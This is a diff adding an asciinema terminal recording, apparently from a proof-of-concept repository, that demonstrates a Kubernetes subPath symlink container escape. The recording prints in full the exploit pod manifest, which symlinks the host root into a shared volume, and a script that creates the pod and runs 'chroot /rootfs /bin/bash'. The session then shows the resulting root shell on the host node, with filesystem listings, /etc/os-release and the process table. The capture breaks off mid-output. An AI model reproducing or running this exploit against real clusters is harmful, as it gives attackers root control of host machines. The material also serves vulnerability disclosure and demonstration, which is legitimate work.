@@ -1,0 +1,1242 @@
+{
+  "version": 1,
+  "width": 112,
+  "height": 32,
+  "duration": 66.327993,
+  "command": "/bin/bash --rcfile ~/.bash_profile",
+  "title": null,
+  "env": {
+    "TERM": "xterm-256color",
+    "SHELL": "/bin/bash"
+  },
+  "stdout": [
+    [
+      0.726246,
+      "\u001b[?1034h\u001b]0;geese@mb: ~/code/github/subpath-exploit\u0007\u001b[0;32m~/code/github/subpath-exploit\u001b[0m[\u001b[0;37mmaster\u001b[0m]$ "
+    ],
+    [
+      0.806122,
+      "k"
+    ],
+    [
+      5.3e-05,
+      "ub"
+    ],
+    [
+      3.8e-05,
+      "e"
+    ],
+    [
+      3.5e-05,
+      "c"
+    ],
+    [
+      3e-05,
+      "t"
+    ],
+    [
+      2.8e-05,
+      "l"
+    ],
+    [
+      2.9e-05,
+      " "
+    ],
+    [
+      6.9e-05,
+      "g"
+    ],
+    [
+      5.4e-05,
+      "et "
+    ],
+    [
+      3.2e-05,
+      "n"
+    ],
+    [
+      2.7e-05,
+      "o"
+    ],
+    [
+      2.6e-05,
+      "d"
+    ],
+    [
+      2.7e-05,
+      "e"
+    ],
+    [
+      2.8e-05,
+      "s"
+    ],
+    [
+      0.648882,
+      "\r\n"
+    ],
+    [
+      1.060307,
+      "NAME           STATUS    ROLES     AGE       VERSION\r\nip-10-1-0-10   Ready     <none>    45d       v1.9.2\r\nip-10-1-0-11   Ready"
+    ],
+    [
+      5e-05,
+      "     <none>    45d       v1.9.2\r\nip-10-1-0-12   Ready     <none>    45d       v1.9.2\r\n"
+    ],
+    [
+      0.039463,
+      "\u001b]0;geese@mb: ~/code/github/subpath-exploit\u0007\u001b[0;32m~/code/github/subpath-exploit\u001b[0m[\u001b[0;37mmaster\u001b[0m]$ "
+    ],
+    [
+      2.0,
+      "k"
+    ],
+    [
+      4.1e-05,
+      "ube"
+    ],
+    [
+      3.1e-05,
+      "c"
+    ],
+    [
+      3.7e-05,
+      "tl"
+    ],
+    [
+      2.8e-05,
+      " "
+    ],
+    [
+      2.6e-05,
+      "g"
+    ],
+    [
+      2.6e-05,
+      "e"
+    ],
+    [
+      0.000105,
+      "t po"
+    ],
+    [
+      2.8e-05,
+      "d"
+    ],
+    [
+      2.6e-05,
+      "s"
+    ],
+    [
+      0.750528,
+      "\r\n"
+    ],
+    [
+      0.138315,
+      "No resources found.\r\n"
+    ],
+    [
+      0.035803,
+      "\u001b]0;geese@mb: ~/code/github/subpath-exploit\u0007\u001b[0;32m~/code/github/subpath-exploit\u001b[0m[\u001b[0;37mmaster\u001b[0m]$ "
+    ],
+    [
+      2.0,
+      "l"
+    ],
+    [
+      0.0001,
+      "e"
+    ],
+    [
+      4.2e-05,
+      "ss"
+    ],
+    [
+      3.1e-05,
+      " "
+    ],
+    [
+      4.4e-05,
+      "ex"
+    ],
+    [
+      3.6e-05,
+      "p"
+    ],
+    [
+      3.1e-05,
+      "l"
+    ],
+    [
+      3.1e-05,
+      "o"
+    ],
+    [
+      3e-05,
+      "i"
+    ],
+    [
+      2.9e-05,
+      "t"
+    ],
+    [
+      2.9e-05,
+      "-"
+    ],
+    [
+      2.9e-05,
+      "p"
+    ],
+    [
+      3e-05,
+      "o"
+    ],
+    [
+      4.4e-05,
+      "d."
+    ],
+    [
+      6.7e-05,
+      "y"
+    ],
+    [
+      5.5e-05,
+      "am"
+    ],
+    [
+      8e-05,
+      "l"
+    ],
+    [
+      0.972937,
+      "\r\n"
+    ],
+    [
+      0.011438,
+      "\u001b[?1049h\u001b[?1h\u001b=\r"
+    ],
+    [
+      0.000163,
+      "---\r\napiVersion: v1\r\nkind: Pod\r\nmetadata:\r\n  name: subpath\r\nspec:\r\n  containers:\r\n  - image: nginx:latest\r\n    securityContext:\r\n      allowPrivilegeEscalation: false\r\n      capabilities:\r\n        drop:\r\n          - CHOWN\r\n          - DAC_OVERRIDE\r\n          - FOWNER\r\n          - FSETID\r\n          - KILL\r\n          - SETGID\r\n          - SETUID\r\n          - SETPCAP\r\n          - NET_BIND_SERVICE\r\n          - NET_ADMIN\r\n          - NET_RAW\r\n          - MKNOD\r\n          - AUDIT_WRITE\r\n    name: setup\r\n    imagePullPolicy: \"Always\"\r\n    command: [\"/bin/bash\"]\r\n    args: [\"-c\", \"cd /rootfs && rm -rf hostetc && ln -s / /rootfs/host && touch /status/done && sleep infinity\"]\r\n    volumeMounts:\r\n    - mountPath: /rootfs\r\n\u001b[7mexploit-pod.yaml\u001b[27m\u001b[K"
+    ],
+    [
+      1.563836,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO"
+    ],
+    [
+      3.9e-05,
+      "\u001b[KB\bB\r\u001b[K      name: escape-volume\r\n:\u001b[K"
+    ],
+    [
+      0.494382,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO"
+    ],
+    [
+      3.8e-05,
+      "\u001b[KB\bB\r\u001b[K    - mountPath: /status\r\n:\u001b[K"
+    ],
+    [
+      0.472525,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO"
+    ],
+    [
+      3.5e-05,
+      "\u001b[KB\bB\r\u001b[K      name: status-volume\r\n:\u001b[K"
+    ],
+    [
+      0.382628,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO"
+    ],
+    [
+      3.5e-05,
+      "\u001b[KB\bB\r\u001b[K  - image: nginx:latest\r\n:\u001b[K"
+    ],
+    [
+      0.404793,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO"
+    ],
+    [
+      6.9e-05,
+      "\u001b[KB\bB\r\u001b[K    securityContext:\r\n:\u001b[K"
+    ],
+    [
+      0.373409,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO\u001b[KB\bB\r\u001b[K"
+    ],
+    [
+      6.5e-05,
+      "      allowPrivilegeEscalation: false\r\n:\u001b[K"
+    ],
+    [
+      0.222583,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO\u001b[KB\bB\r\u001b[K"
+    ],
+    [
+      4.2e-05,
+      "      capabilities:\r\n:\u001b[K"
+    ],
+    [
+      0.270184,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO"
+    ],
+    [
+      3.6e-05,
+      "\u001b[KB\bB\r\u001b[K        drop:\r\n:\u001b[K"
+    ],
+    [
+      0.258618,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO"
+    ],
+    [
+      3.1e-05,
+      "\u001b[KB\bB\r\u001b[K          - CHOWN\r\n:\u001b[K"
+    ],
+    [
+      0.213741,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO"
+    ],
+    [
+      3.7e-05,
+      "\u001b[KB\bB\r\u001b[K          - DAC_OVERRIDE\r\n:\u001b[K"
+    ],
+    [
+      0.236103,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO"
+    ],
+    [
+      3.4e-05,
+      "\u001b[KB\bB\r\u001b[K          - FOWNER\r\n:\u001b[K"
+    ],
+    [
+      0.224967,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO"
+    ],
+    [
+      3.5e-05,
+      "\u001b[KB\bB\r\u001b[K          - FSETID\r\n:\u001b[K"
+    ],
+    [
+      0.225038,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO"
+    ],
+    [
+      4.3e-05,
+      "\u001b[KB\bB\r\u001b[K          - KILL\r\n:\u001b[K"
+    ],
+    [
+      0.224926,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO\u001b[KB\bB\r\u001b[K"
+    ],
+    [
+      4e-05,
+      "          - SETGID\r\n:\u001b[K"
+    ],
+    [
+      0.202455,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO"
+    ],
+    [
+      3.4e-05,
+      "\u001b[KB\bB\r\u001b[K          - SETUID\r\n:\u001b[K"
+    ],
+    [
+      0.202534,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO\u001b[KB\bB\r\u001b[K"
+    ],
+    [
+      3.7e-05,
+      "          - SETPCAP\r\n:\u001b[K"
+    ],
+    [
+      0.168772,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO\u001b[KB\bB\r\u001b[K          - NET_BIND_SERVICE\r\n:\u001b[K"
+    ],
+    [
+      0.213705,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO"
+    ],
+    [
+      3.6e-05,
+      "\u001b[KB\bB\r\u001b[K          - NET_ADMIN\r\n:\u001b[K"
+    ],
+    [
+      0.191183,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO"
+    ],
+    [
+      3.7e-05,
+      "\u001b[KB\bB\r\u001b[K          - NET_RAW\r\n:\u001b[K"
+    ],
+    [
+      0.213505,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO"
+    ],
+    [
+      3.1e-05,
+      "\u001b[KB\bB\r\u001b[K          - MKNOD\r\n:\u001b[K"
+    ],
+    [
+      0.821387,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO\u001b[KB\bB\r\u001b[K"
+    ],
+    [
+      3.7e-05,
+      "          - AUDIT_WRITE\r\n:\u001b[K"
+    ],
+    [
+      0.213728,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO\u001b[KB\bB\r\u001b[K"
+    ],
+    [
+      4.4e-05,
+      "    name: exploit\r\n:\u001b[K"
+    ],
+    [
+      0.191257,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO"
+    ],
+    [
+      3.5e-05,
+      "\u001b[KB\bB\r\u001b[K    imagePullPolicy: \"Always\"\r\n:\u001b[K"
+    ],
+    [
+      0.202415,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO"
+    ],
+    [
+      3.9e-05,
+      "\u001b[KB\bB\r\u001b[K    command: [\"/bin/bash\"]\r\n:\u001b[K"
+    ],
+    [
+      0.193125,
+      "\r\u001b[K \u001b[KESC\b\b\bESC"
+    ],
+    [
+      0.000204,
+      "\u001b[KO\bO\u001b[KB\bB\r\u001b[K    args: [\"-c\", \"if [[ -f /status/done ]];then sleep infinity; else sleep 1; fi\"]\r\n:\u001b[K"
+    ],
+    [
+      0.211676,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO"
+    ],
+    [
+      3.5e-05,
+      "\u001b[KB\bB\r\u001b[K    volumeMounts:\r\n:\u001b[K"
+    ],
+    [
+      0.574183,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO\u001b[KB\bB\r\u001b[K    - mountPath: /rootfs\r\n:\u001b[K"
+    ],
+    [
+      0.291987,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO"
+    ],
+    [
+      3.5e-05,
+      "\u001b[KB\bB\r\u001b[K      name: escape-volume\r\n:\u001b[K"
+    ],
+    [
+      0.393828,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO"
+    ],
+    [
+      3.6e-05,
+      "\u001b[KB\bB\r\u001b[K      subPath: host\r\n:\u001b[K"
+    ],
+    [
+      0.269935,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO\u001b[KB\bB\r\u001b[K"
+    ],
+    [
+      4.5e-05,
+      "    - mountPath: /status\r\n:\u001b[K"
+    ],
+    [
+      0.22493,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO"
+    ],
+    [
+      3.7e-05,
+      "\u001b[KB\bB\r\u001b[K      name: status-volume\r\n:\u001b[K"
+    ],
+    [
+      0.191269,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO\u001b[KB\bB\r\u001b[K"
+    ],
+    [
+      4.6e-05,
+      "  volumes:\r\n:\u001b[K"
+    ],
+    [
+      0.191161,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO"
+    ],
+    [
+      3.6e-05,
+      "\u001b[KB\bB\r\u001b[K  - name: escape-volume\r\n:\u001b[K"
+    ],
+    [
+      0.179989,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO"
+    ],
+    [
+      3.5e-05,
+      "\u001b[KB\bB\r\u001b[K    emptyDir: {}\r\n:\u001b[K"
+    ],
+    [
+      0.224943,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO\u001b[KB\bB\r\u001b[K"
+    ],
+    [
+      3.8e-05,
+      "  - name: status-volume\r\n:\u001b[K"
+    ],
+    [
+      0.213661,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO\u001b[KB\bB\r\u001b[K"
+    ],
+    [
+      3.7e-05,
+      "    emptyDir: {}\r\n\u001b[7m(END)\u001b[27m\u001b[K"
+    ],
+    [
+      0.180041,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO"
+    ],
+    [
+      3.4e-05,
+      "\u001b[KB\bB\r\u001b[K\u0007\r\u001b[K\u001b[7m(END)\u001b[27m\u001b[K"
+    ],
+    [
+      0.224958,
+      "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[KO\bO\u001b[KB\bB\r\u001b[K"
+    ],
+    [
+      4.8e-05,
+      "\u0007\r\u001b[K\u001b[7m(END)\u001b[27m\u001b[K"
+    ],
+    [
+      2.0,
+      "\r\u001b[K\u001b[?1l\u001b>\u001b[?1049l"
+    ],
+    [
+      0.057616,
+      "\u001b]0;geese@mb: ~/code/github/subpath-exploit\u0007\u001b[0;32m~/code/github/subpath-exploit\u001b[0m[\u001b[0;37mmaster\u001b[0m]$ "
+    ],
+    [
+      0.560964,
+      "c"
+    ],
+    [
+      4.4e-05,
+      "at"
+    ],
+    [
+      2.9e-05,
+      " r"
+    ],
+    [
+      3.7e-05,
+      "u"
+    ],
+    [
+      2.8e-05,
+      "n"
+    ],
+    [
+      4.4e-05,
+      "-"
+    ],
+    [
+      3.2e-05,
+      "a"
+    ],
+    [
+      2.7e-05,
+      "s"
+    ],
+    [
+      2.8e-05,
+      "-r"
+    ],
+    [
+      7.6e-05,
+      "oo"
+    ],
+    [
+      4.3e-05,
+      "t."
+    ],
+    [
+      2.9e-05,
+      "s"
+    ],
+    [
+      3e-05,
+      "h"
+    ],
+    [
+      1.717857,
+      "\r\n"
+    ],
+    [
+      0.0062,
+      "#!/bin/bash\r\n\r\necho \"Create the pod...\"\r\nkubectl create -f exploit-pod.yaml\r\necho \"Pod created.  Sleeping a bit to allow them to come up\"\r\nsleep 5\r\necho \"Execing into the container with a root shell on the underlying host\"\r\nkubectl exec -it subpath -c exploit -- chroot /rootfs /bin/bash\r\necho \"Cleaning up\"\r\nkubectl delete -f exploit-pod.yaml\r\n"
+    ],
+    [
+      0.03406,
+      "\u001b]0;geese@mb: ~/code/github/subpath-exploit\u0007\u001b[0;32m~/code/github/subpath-exploit\u001b[0m[\u001b[0;37mmaster\u001b[0m]$ "
+    ],
+    [
+      2.0,
+      "k"
+    ],
+    [
+      0.000128,
+      "ubect"
+    ],
+    [
+      6.2e-05,
+      "l"
+    ],
+    [
+      3.3e-05,
+      " c"
+    ],
+    [
+      3.1e-05,
+      "r"
+    ],
+    [
+      3.2e-05,
+      "e"
+    ],
+    [
+      3.1e-05,
+      "a"
+    ],
+    [
+      6.8e-05,
+      "te"
+    ],
+    [
+      3e-05,
+      " "
+    ],
+    [
+      5.6e-05,
+      "-"
+    ],
+    [
+      7.6e-05,
+      "f "
+    ],
+    [
+      3.1e-05,
+      "e"
+    ],
+    [
+      3.3e-05,
+      "x"
+    ],
+    [
+      2.5e-05,
+      "pl"
+    ],
+    [
+      5.2e-05,
+      "o"
+    ],
+    [
+      3.5e-05,
+      "it"
+    ],
+    [
+      2.9e-05,
+      "-"
+    ],
+    [
+      2.5e-05,
+      "p"
+    ],
+    [
+      2.7e-05,
+      "o"
+    ],
+    [
+      3e-05,
+      "d"
+    ],
+    [
+      3e-05,
+      ".y"
+    ],
+    [
+      4.6e-05,
+      "a"
+    ],
+    [
+      3.7e-05,
+      "m"
+    ],
+    [
+      3e-05,
+      "l"
+    ],
+    [
+      0.952145,
+      "\r\n"
+    ],
+    [
+      0.246731,
+      "pod \"subpath\" created\r\n"
+    ],
+    [
+      0.05214,
+      "\u001b]0;geese@mb: ~/code/github/subpath-exploit\u0007\u001b[0;32m~/code/github/subpath-exploit\u001b[0m[\u001b[0;37mmaster\u001b[0m]$ "
+    ],
+    [
+      2.0,
+      "k"
+    ],
+    [
+      3.8e-05,
+      "ube"
+    ],
+    [
+      2.6e-05,
+      "ct"
+    ],
+    [
+      3e-05,
+      "l"
+    ],
+    [
+      2.4e-05,
+      " "
+    ],
+    [
+      3.5e-05,
+      "ex"
+    ],
+    [
+      3.9e-05,
+      "e"
+    ],
+    [
+      2.5e-05,
+      "c"
+    ],
+    [
+      2.4e-05,
+      " "
+    ],
+    [
+      2.5e-05,
+      "-"
+    ],
+    [
+      2.6e-05,
+      "i"
+    ],
+    [
+      2.4e-05,
+      "t"
+    ],
+    [
+      2.3e-05,
+      " "
+    ],
+    [
+      6.3e-05,
+      "s"
+    ],
+    [
+      3.2e-05,
+      "ub"
+    ],
+    [
+      2.9e-05,
+      "p"
+    ],
+    [
+      2.7e-05,
+      "a"
+    ],
+    [
+      2.8e-05,
+      "t"
+    ],
+    [
+      2.6e-05,
+      "h"
+    ],
+    [
+      5.9e-05,
+      " "
+    ],
+    [
+      4.3e-05,
+      "-"
+    ],
+    [
+      3e-05,
+      "c"
+    ],
+    [
+      2.9e-05,
+      " "
+    ],
+    [
+      3.8e-05,
+      "ex"
+    ],
+    [
+      3e-05,
+      "p"
+    ],
+    [
+      2.7e-05,
+      "l"
+    ],
+    [
+      2.9e-05,
+      "o"
+    ],
+    [
+      3e-05,
+      "i"
+    ],
+    [
+      2.9e-05,
+      "t"
+    ],
+    [
+      2.9e-05,
+      " "
+    ],
+    [
+      2.8e-05,
+      "-"
+    ],
+    [
+      2.9e-05,
+      "-"
+    ],
+    [
+      3.1e-05,
+      " "
+    ],
+    [
+      2.9e-05,
+      "c"
+    ],
+    [
+      2.7e-05,
+      "h"
+    ],
+    [
+      2.9e-05,
+      "r"
+    ],
+    [
+      3e-05,
+      "o"
+    ],
+    [
+      3.1e-05,
+      "o"
+    ],
+    [
+      2.6e-05,
+      "t"
+    ],
+    [
+      2.9e-05,
+      " "
+    ],
+    [
+      3.8e-05,
+      "/"
+    ],
+    [
+      3e-05,
+      "r"
+    ],
+    [
+      2.7e-05,
+      "o"
+    ],
+    [
+      3e-05,
+      "o"
+    ],
+    [
+      3e-05,
+      "t"
+    ],
+    [
+      3.5e-05,
+      "f"
+    ],
+    [
+      2.8e-05,
+      "s"
+    ],
+    [
+      3.2e-05,
+      " "
+    ],
+    [
+      3e-05,
+      "/"
+    ],
+    [
+      2.9e-05,
+      "b"
+    ],
+    [
+      2.8e-05,
+      "i"
+    ],
+    [
+      3.2e-05,
+      "n"
+    ],
+    [
+      3e-05,
+      "/"
+    ],
+    [
+      3e-05,
+      "b"
+    ],
+    [
+      2.7e-05,
+      "a"
+    ],
+    [
+      3.1e-05,
+      "s"
+    ],
+    [
+      3e-05,
+      "h"
+    ],
+    [
+      0.838855,
+      "\r\n"
+    ],
+    [
+      0.339972,
+      "\u001b]0;root@subpath: /\u0007root@subpath:/# "
+    ],
+    [
+      2.0,
+      "l"
+    ],
+    [
+      0.0885,
+      "s"
+    ],
+    [
+      0.171436,
+      "\r\n\u001b[0m\u001b[01;34mbin\u001b[0m   \u001b[01;34mdev\u001b[0m  \u001b[01;34mhome\u001b[0m        \u001b[01;36minitrd.img.old\u001b[0m  \u001b[01;34mlib64\u001b[0m       \u001b[01;34mmedia\u001b[0m  \u001b[01;34mopt\u001b[0m   \u001b[01;34mroot\u001b[0m  \u001b[01;34msbin\u001b[0m  \u001b[01;34msrv\u001b[0m  \u001b[30;42mtmp\u001b[0m  \u001b[01;34mvar\u001b[0m      \u001b[01;36mvmlinuz.old\u001b[0m\r\n\u001b[01;34mboot\u001b[0m  \u001b[01;34metc\u001b[0m  \u001b[01;36minitrd.img\u001b[0m  \u001b[01;34mlib\u001b[0m             \u001b[01;34mlost+found\u001b[0m  \u001b[01;34mmnt\u001b[0m    \u001b[01;34mproc\u001b[0m  \u001b[01;34mrun\u001b[0m   \u001b[01;34msnap\u001b[0m  \u001b[01;34msys\u001b[0m  \u001b[01;34musr\u001b[0m  \u001b[01;36mvmlinuz\u001b[0m\r\n\u001b]0;root@subpath: /\u0007root@subpath:/# "
+    ],
+    [
+      2.0,
+      "l"
+    ],
+    [
+      0.086382,
+      "s"
+    ],
+    [
+      0.067347,
+      " "
+    ],
+    [
+      0.160737,
+      "-"
+    ],
+    [
+      0.053493,
+      "a"
+    ],
+    [
+      0.181403,
+      "l"
+    ],
+    [
+      0.227643,
+      "\r\ntotal 96\r\ndrwxr-xr-x  23 root root  4096 Mar 17 14:36 \u001b[0m\u001b[01;34m.\u001b[0m\r\ndrwxr-xr-x  23 root root  4096 Mar 17 14:36 \u001b[01;34m..\u001b[0m\r\ndrwxr-xr-x   2 root root  4096 Mar 17 14:36 \u001b[01;34mbin\u001b[0m\r\ndrwxr-xr-x   3 root root  4096 Mar 17 14:37 \u001b[01;34mboot\u001b[0m\r\ndrwxr-xr-x  14 root root  3800 Mar 17 14:35 \u001b[01;34mdev\u001b[0m\r\ndrwxr-xr-x  94 root root  4096 Mar 17 14:37 \u001b[01;34metc\u001b[0m\r\ndrwxr-xr-x   3 root root  4096 Feb  5 14:31 \u001b[01;34mhome\u001b[0m\r\nlrwxrwxrwx   1 root root    30 Mar 17 14:36 \u001b[01;36minitrd.img\u001b[0m -> boot/initrd.img-4.4.0-1052-aws\r\nlrwxrwxrwx   1 root root    30 Jan 26 06:07 \u001b[01;36minitrd.img.old\u001b[0m -> boot/initrd.img-4.4.0-1049-aws\r\ndrwxr-xr-x  22 root root  4096 Feb  5 14:32 \u001b[01;34mlib\u001b[0m\r\ndrwxr-xr-x   2 root root  4096 Jan 26 05:54 \u001b[01;34mlib64\u001b[0m\r\ndrwx------   2 root root 16384 Jan 26 06:01 \u001b[01;34mlost+found\u001b[0m\r\ndrwxr-xr-x   2 root root  4096 Jan 26 05:53 \u001b[01;34mmedia\u001b[0m\r\ndrwxr-xr-x   2 root root  4096 Jan 26 05:53 \u001b[01;34mmnt\u001b[0m\r\ndrwxr-xr-x   3 root root  4096 Feb  5 14:33 \u001b[01;34mopt\u001b[0"
+    ],
+    [
+      0.000136,
+      "m\r\ndr-xr-xr-x 136 root root     0 Mar 17 14:35 \u001b[01;34mproc\u001b[0m\r\ndrwx------   3 root root  4096 Mar 22 16:41 \u001b[01;34mroot\u001b[0m\r\ndrwxr-xr-x  27 root root  1140 Mar 19 02:06 \u001b[01;34mrun\u001b[0m\r\ndrwxr-xr-x   2 root root 12288 Mar 17 14:36 \u001b[01;34msbin\u001b[0m\r\ndrwxr-xr-x   2 root root  4096 Nov 30 19:48 \u001b[01;34msnap\u001b[0m\r\ndrwxr-xr-x   2 root root  4096 Jan 26 05:53 \u001b[01;34msrv\u001b[0m\r\ndr-xr-xr-x  13 root root     0 Mar 22 15:22 \u001b[01;34msys\u001b[0m\r\ndrwxrwxrwt   8 root root  4096 Mar 23 13:17 \u001b[30;42mtmp\u001b[0m\r\ndrwxr-xr-x  11 root root  4096 Feb  5 14:34 \u001b[01;34musr\u001b[0m\r\ndrwxr-xr-x  13 root root  4096 Jan 26 05:55 \u001b[01;34mvar\u001b[0m\r\nlrwxrwxrwx   1 root root    27 Mar 17 14:36 \u001b[01;36mvmlinuz\u001b[0m -> boot/vmlinuz-4.4.0-1052-aws\r\nlrwxrwxrwx   1 root root    27 Jan 26 06:07 \u001b[01;36mvmlinuz.old\u001b[0m -> boot/vmlinuz-4.4.0-1049-aws\r\n\u001b]0;root@subpath: /\u0007root@subpath:/# "
+    ],
+    [
+      1.810731,
+      "c"
+    ],
+    [
+      0.167847,
+      "a"
+    ],
+    [
+      0.065071,
+      "t"
+    ],
+    [
+      0.100232,
+      " "
+    ],
+    [
+      0.125662,
+      "/"
+    ],
+    [
+      0.078906,
+      "e"
+    ],
+    [
+      0.044324,
+      "t"
+    ],
+    [
+      0.204728,
+      "c"
+    ],
+    [
+      0.076904,
+      "/"
+    ],
+    [
+      0.135075,
+      "h"
+    ],
+    [
+      0.111515,
+      "o"
+    ],
+    [
+      0.169913,
+      "s"
+    ],
+    [
+      0.088997,
+      "t"
+    ],
+    [
+      0.160104,
+      "n"
+    ],
+    [
+      0.097814,
+      "a"
+    ],
+    [
+      0.115463,
+      "m"
+    ],
+    [
+      0.077628,
+      "e"
+    ],
+    [
+      0.138046,
+      "\r\nip-10-1-0-10\r\n\u001b]0;root@subpath: /\u0007root@subpath:/# "
+    ],
+    [
+      1.910071,
+      "c"
+    ],
+    [
+      0.158056,
+      "a"
+    ],
+    [
+      0.088268,
+      "t"
+    ],
+    [
+      0.100241,
+      " "
+    ],
+    [
+      0.067553,
+      "/"
+    ],
+    [
+      0.079264,
+      "e"
+    ],
+    [
+      0.055812,
+      "t"
+    ],
+    [
+      0.216398,
+      "c"
+    ],
+    [
+      0.123687,
+      "/"
+    ],
+    [
+      0.318294,
+      "o"
+    ],
+    [
+      0.028226,
+      "s"
+    ],
+    [
+      0.181166,
+      "-"
+    ],
+    [
+      0.158465,
+      "r"
+    ],
+    [
+      0.076807,
+      "e"
+    ],
+    [
+      0.158924,
+      "l"
+    ],
+    [
+      0.043519,
+      "e"
+    ],
+    [
+      0.137167,
+      "a"
+    ],
+    [
+      0.088521,
+      "s"
+    ],
+    [
+      0.100067,
+      "e"
+    ],
+    [
+      0.249979,
+      "\r\nNAME=\"Ubuntu\"\r\nVERSION=\"16.04.3 LTS (Xenial Xerus)\"\r\nID=ubuntu\r\nID_LIKE=debian\r\nPRETTY_NAME=\"Ubuntu 16.04.3 LTS\"\r\nVERSION_ID=\"16.04\"\r\nHOME_URL=\"http://www.ubuntu.com/\"\r\nSUPPORT_URL=\"http://help.ubuntu.com/\"\r\nBUG_REPORT_URL=\"http://bugs.launchpad.net/ubuntu/\"\r\nVERSION_CODENAME=xenial\r\nUBUNTU_CODENAME=xenial\r\n\u001b]0;root@subpath: /\u0007root@subpath:/# "
+    ],
+    [
+      2.0,
+      "p"
+    ],
+    [
+      0.06502,
+      "s"
+    ],
+    [
+      0.10029,
+      " "
+    ],
+    [
+      0.090557,
+      "-"
+    ],
+    [
+      0.055896,
+      "e"
+    ],
+    [
+      0.079124,
+      "f"
+    ],
+    [
+      0.101014,
+      "\r\n"
+    ],
+    [
+      0.013595,
+      "UID        PID  PPID  C STIME TTY          TIME CMD\r\nroot         1     0  0 Mar17 ?        00:00:05 /lib/systemd/systemd --system --deserialize 26\r\nroot         2     0  0 Mar17 ?        00:00:00 [kthreadd]\r\nroot         3     2  0 Mar17 ?        00:00:27 [ksoftirqd/0]\r\nroot         5     2  0 Mar17 ?        00:00:00 [kworker/0:0H]\r\nroot         7     2  0 Mar17 ?        00:00:47 [rcu_sched]\r\nroot         8     2  0 Mar17 ?        00:00:00 [rcu_bh]\r\nroot         9     2  0 Mar17 ?        00:00:00 [migration/0]\r\nroot        10     2  0 Mar17 ?        00:00:01 [watchdog/0]\r\nroot        11     2  0 Mar17 ?        00:00:00 [kdevtmpfs]\r\nroot        12     2  0 Mar17 ?        00:00:00 [netns]\r\nroot        13     2  0 Mar17 ?        00:00:00 [perf]\r\nroot        14     2  0 Mar17 ?        00:00:00 [xenwatch]\r\nroot        15     2  0 Mar17 ?        00:00:00 [xenbus]\r\nroot        17     2  0 Mar17 ?        00:00:00 [khungtaskd]\r\nroot        18     2  0 Mar17 ?        00:00:00 [writeback]\r\nroot        19     2  0 Mar17"
+    ],
+    [
+      7.9e-05,
+      " ?        00:00:00 [ksmd]\r\nroot        20     2  0 Mar17 ?        00:00:00 [khugepaged]\r\nroot        21     2  0 Mar17 ?        00:00:00 [crypto]\r\nroot        22     2  0 Mar17 ?        00:00:00 [kintegrityd]\r\nroot        23     2  0 Mar17 ?        00:00:00 [bioset]\r\nroot        24     2  0 Mar17 ?        00:00:00 [kblockd]\r\nroot        25     2  0 Mar17 ?        00:00:00 [ata_sff]\r\nroot        26     2  0 Mar17 ?        00:00:00 [md]\r\nroot        27     2  0 Mar17 ?        00:00:00 [devfreq_wq]\r\nroot        30     2  0 Mar17 ?        00:00:00 [kswapd0]\r\nroot        31     2  0 Mar17 ?        00:00:00 [vmstat]\r\nroot        32     2  0 Mar17 ?        00:00:00 [fsnotify_mark]\r\nroot        33     2  0 Mar17 ?        00:00:00 [ecryptfs-kthrea]\r\nroot        49     2  0 Mar17 ?        00:00:00 [kthrotld]\r\nroot        50     2  0 Mar17 ?        00:00:00 [bioset]\r\nroot        51     2  0 Mar17 ?        00:00:00 [bioset]\r\nroot        52     2  0 Mar17 ?        00:00:00 [bioset]\r\nroot        53     2  0 Mar17 ?        "
+    ],
+    [
+      8e-05,
